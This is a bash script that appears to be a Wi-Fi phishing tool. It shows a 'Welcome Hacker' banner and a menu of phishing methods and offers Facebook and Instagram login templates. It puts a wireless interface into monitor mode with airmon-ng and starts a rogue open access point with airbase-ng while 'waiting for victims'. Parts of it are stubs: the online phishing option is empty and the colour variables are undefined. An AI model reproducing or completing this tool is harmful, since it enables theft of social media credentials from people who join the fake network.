#!/bin/bash

# Function to clear the terminal
clear_terminal() {
    clear
}

# Function to display the big welcome message
big_welcome() {
    echo -e "${RED} __    __    ___  _        __   ___   ___ ___    ___      __ __   ____    __  __  _    ___  ____  ${NC}"
    echo -e "${RED}|  |__|  |  /  _]| |      /  ] /   \ |   |   |  /  _]    |  |  | /    |  /  ]|  |/ ]  /  _]|    \ ${NC}"
    echo -e "${RED}|  |  |  | /  [_ | |     /  / |     || _   _ | /  [_     |  |  ||  o  | /  / |  ' /  /  [_ |  D  )${NC}"
    echo -e "${RED}|  |  |  ||    _]| |___ /  /  |  O  ||  \_/  ||    _]    |  _  ||     |/  /  |    \ |    _]|    / ${NC}"
    echo -e "${RED}|  \`  '  ||   [_ |     /   \_ |     ||   |   ||   [_     |  |  ||  _  /   \_ |     ||   [_ |    \ ${NC}"
    echo -e "${RED} \      / |     ||     \     ||     ||   |   ||     |    |  |  ||  |  \     ||  .  ||     ||  .  \${NC}"
    echo -e "${RED}  \_/\_/  |_____||_____|\____| \___/ |___|___||_____|    |__|__||__|__|\____||__|\_||_____||__|\_${NC}"
}

# Function to display the menu for phishing options
menu() {
    echo -e "Select phishing method:"
    echo "1. Online Phishing"
    echo "2. Captive Portal Phishing"
    read -p "Enter your choice: " choice
    case $choice in
        1) online_phishing ;;
        2) captive_portal_phishing ;;
        *) echo "Invalid choice. Please try again." ;;
    esac
}

# Function for online phishing
online_phishing() {
    echo "Online Phishing selected."
    # Implement online phishing logic here
}

# Function for captive portal phishing
captive_portal_phishing() {
    echo "Captive Portal Phishing selected."
    # Start captive portal phishing
    select_interface
}

# Function to select network interface
select_interface() {
    echo "Select network interface:"
    interfaces=$(ifconfig -a | grep -oE "^[a-zA-Z0-9]+" | grep -v "lo")
    select interface in $interfaces; do
        if [ -n "$interface" ]; then
            echo "Selected interface: $interface"
            choose_template "$interface"
            break
        else
            echo "Invalid selection. Please try again."
        fi
    done
}

# Function to let the user choose a template
choose_template() {
    echo -e "${YELLOW}Available Template Options:${NC}"
    echo -e "${YELLOW}1. Facebook${NC}"
    echo -e "${YELLOW}2. Instagram${NC}"
    read -p "Choose a template option: " template_option

    case $template_option in
        1) template="facebook";;
        2) template="instagram";;
        *) echo "Invalid option. Please choose again."; choose_template;;
    esac

    start_captive_portal "$interface" "$template"
}

# Function to start captive portal phishing
start_captive_portal() {
    interface=$1
    template=$2
    echo "Starting captive portal phishing on interface: $interface"
    # Set interface to monitor mode
    airmon-ng start $interface
    # Start fake AP
    airbase-ng -a AA:BB:CC:DD:EE:FF -e "OpenWiFi by SMPP" -c 6 $interface &
    sleep 5 # Wait for fake AP to start

    # Implement captive portal logic
    echo "Waiting for victims to connect..."
    # Use template to prompt for login
    sleep 10 # Adjust this delay as needed
    while true; do
        if [ -e "/var/www/html/login.php" ]; then
            cat "/var/www/html/login.php"
            break
        fi
        sleep 2
    done
}


# Clear the terminal
clear_terminal

# Display the big welcome message
big_welcome

# Call the menu function to start
menu
